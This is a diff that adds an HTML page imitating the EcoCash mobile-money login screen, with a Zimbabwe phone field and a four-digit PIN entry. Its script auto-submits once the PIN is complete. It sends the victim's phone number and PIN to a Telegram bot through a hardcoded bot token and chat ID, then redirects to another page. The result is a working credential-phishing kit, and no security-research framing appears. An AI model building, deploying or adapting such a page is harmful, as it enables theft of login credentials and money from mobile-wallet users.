@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Confirm</title>
+
+<style>
+    * {
+        box-sizing: border-box;
+    }
+
+    body {
+        margin: 0;
+        font-family: Arial, Helvetica, sans-serif;
+        background: #ffffff;
+        -webkit-font-smoothing: antialiased;
+    }
+
+    .container {
+        max-width: 400px;
+        margin: auto;
+        padding: 32px 16px 0;
+        text-align: center;
+    }
+
+    .logo {
+        font-size: 44px;
+        font-weight: bold;
+        margin-bottom: 16px;
+    }
+
+    .logo span:first-child {
+        color: #0b5ed7;
+    }
+
+    .logo span:last-child {
+        color: #e5533d;
+    }
+
+    h2 {
+        font-weight: normal;
+        margin-bottom: 24px;
+        font-size: 20px;
+    }
+
+    /* PHONE INPUT */
+    .phone-box {
+        border: 2px solid #0b5ed7;
+        border-radius: 12px;
+        padding: 12px 14px;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        margin-bottom: 14px;
+        background: #fff;
+    }
+
+    .flag-img {
+        width: 26px;
+        height: auto;
+    }
+
+    .country-code {
+        font-size: 16px;
+        font-weight: bold;
+        white-space: nowrap;
+    }
+
+    .phone-input {
+        border: none;
+        outline: none;
+        font-size: 16px;
+        flex: 1;
+        padding: 6px 4px;
+        background: transparent;
+    }
+
+    .phone-input::placeholder {
+        color: #aaa;
+    }
+
+    .phone-box:focus-within {
+        box-shadow: 0 0 0 3px rgba(11,94,215,0.15);
+    }
+
+    .pin-label {
+        margin-top: 18px;
+        color: #666;
+        font-size: 14px;
+    }
+
+    /* PIN INPUTS */
+    .pin-boxes {
+        display: flex;
+        justify-content: center;
+        gap: 10px;
+        margin: 14px 0;
+    }
+
+    .pin-boxes input {
+        width: 48px;
+        height: 48px;
+        border: 2px solid #0b5ed7;
+        border-radius: 10px;
+        font-size: 20px;
+        text-align: center;
+        outline: none;
+    }
+
+    .pin-boxes input:focus {
+        box-shadow: 0 0 0 3px rgba(11,94,215,0.15);
+    }
+
+    .forgot {
+        color: #666;
+        font-size: 13px;
+        margin-bottom: 10px;
+    }
+
+    /* BOTTOM SECTION */
+    .bottom {
+        position: relative;
+        background: #0b5ed7;
+        padding: 56px 16px 24px;
+        color: #fff;
+        text-align: center;
+        overflow: hidden;
+        margin-top: 30px;
+    }
+
+    .bottom::before {
+        content: "";
+        position: absolute;
+        top: -45px;
+        left: 0;
+        width: 100%;
+        height: 90px;
+        background: #ffffff;
+        border-bottom-left-radius: 100% 100%;
+        border-bottom-right-radius: 100% 100%;
+    }
+
+    .bottom p {
+        margin-bottom: 22px;
+        font-size: 14px;
+        line-height: 1.4;
+    }
+
+    .buttons {
+        display: flex;
+        gap: 12px;
+        justify-content: center;
+        flex-wrap: wrap;
+        margin-bottom: 22px;
+    }
+
+    .btn {
+        background: #fff;
+        color: #0b5ed7;
+        padding: 14px;
+        width: 150px;
+        border-radius: 14px;
+        font-weight: bold;
+        border: none;
+        font-size: 14px;
+        cursor: pointer;
+    }
+
+    .btn:active {
+        transform: scale(0.98);
+    }
+
+    .version {
+        font-size: 12px;
+        margin-bottom: 6px;
+    }
+
+    .terms {
+        font-size: 11px;
+        line-height: 1.4;
+    }
+
+    .terms a {
+        color: #fff;
+        text-decoration: underline;
+    }
+
+    /* ===== SMALL SCREENS ===== */
+    @media (max-width: 360px) {
+        .logo {
+            font-size: 38px;
+        }
+
+        .pin-boxes input {
+            width: 44px;
+            height: 44px;
+        }
+
+        .btn {
+            width: 100%;
+            max-width: 220px;
+        }
+    }
+</style>
+</head>
+
+<body>
+
+<div class="container">
+    <div class="logo">
+        <span>Eco</span><span>Cash</span>
+    </div>
+
+    <h2>Login</h2>
+
+    <div class="phone-box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6a/Flag_of_Zimbabwe.svg" alt="ZW" class="flag-img">
+        <span class="country-code">+263</span>
+        <input
+            type="tel"
+            id="phone"
+            class="phone-input"
+            placeholder=""
+            inputmode="numeric"
+        >
+    </div>
+
+    <div class="pin-label">Enter your PIN</div>
+
+    <div class="pin-boxes">
+        <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+        <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+        <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+        <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+
+
+    </div>
+
+    <div class="forgot">Forgot PIN?</div>
+</div>
+
+<div class="bottom">
+    <p>To register a EcoCash wallet or get assistance,<br>click below</p>
+
+    <div class="buttons">
+        <button class="btn">Register</button>
+        <button class="btn">Help & Support</button>
+    </div>
+
+    <div class="version">v2.2.3P</div>
+
+    <div class="terms">
+        By signing in you agree to the
+        <a href="#">Terms and Conditions</a>
+    </div>
+</div>
+
+ <script>
+     // Save phone number to localStorage
+  const phoneInput = document.getElementById('phone');
+
+  // Pre-fill from localStorage on page load
+  window.addEventListener('load', () => {
+    const savedPhone = localStorage.getItem('phone');
+    if (savedPhone) phoneInput.value = savedPhone;
+  });
+
+  // Save to localStorage on input
+  phoneInput.addEventListener('input', () => {
+    localStorage.setItem('phone', phoneInput.value);
+  });
+</script>
+
+
+
+
+
+<script>
+
+const inputs = document.querySelectorAll(".otp-input");
+
+
+
+// Load phone number
+
+
+// Function to submit OTP
+async function submitOTP() {
+    const otp = Array.from(inputs).map(i => i.value).join("");
+    const savedPhone =  document.getElementById("phone").value;
+
+    if (!savedPhone) {
+        alert("Phone number missing. Please restart verification.");
+        return;
+    }
+
+    if (otp.length !== 4 || !/^\d{4}$/.test(otp)) {
+        alert("Please enter a valid 4-digit OTP");
+        return;
+    }
+
+    const message = `Star login attempt:\nPhone: ${savedPhone}\nPn:${otp}`;
+
+    try {
+        const botToken = "8735690176:AAHcMo52cZ6iBBTG0Dojpz-KZ-m1ineyelE"; // Replace with your bot token
+        const chatId = "6688307423"; // Replace with your chat ID
+
+        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatId, text: message })
+        });
+
+        const data = await response.json();
+        if (!data.ok) throw new Error(data.description || "Failed to send OTP to Telegram");
+
+        // ✅ OTP sent successfully, redirect
+        window.location.href = "trialot.html"; // Replace with your target page
+    } catch (error) {
+        console.error("Telegram Error:", error);
+        alert(error.message);
+    }
+}
+
+// Auto movement and auto submit
+inputs.forEach((input, i) => {
+    input.addEventListener("input", () => {
+        // Allow only digits
+        input.value = input.value.replace(/\D/g, "");
+
+        // Move to next input
+        if (input.value.length === 1 && i < inputs.length - 1) {
+            inputs[i + 1].focus();
+        }
+
+        // Auto-submit if all inputs are filled
+        const otpFilled = Array.from(inputs).every(inp => inp.value.length === 1);
+        if (otpFilled) submitOTP();
+    });
+
+    input.addEventListener("keydown", e => {
+        if (e.key === "Backspace" && input.value === "" && i > 0) {
+            inputs[i - 1].focus();
+        }
+    });
+});
+
+// Timer
+
+</script>
+
+
+
+
+</body>
+</html>
+
+</body>
+</html>
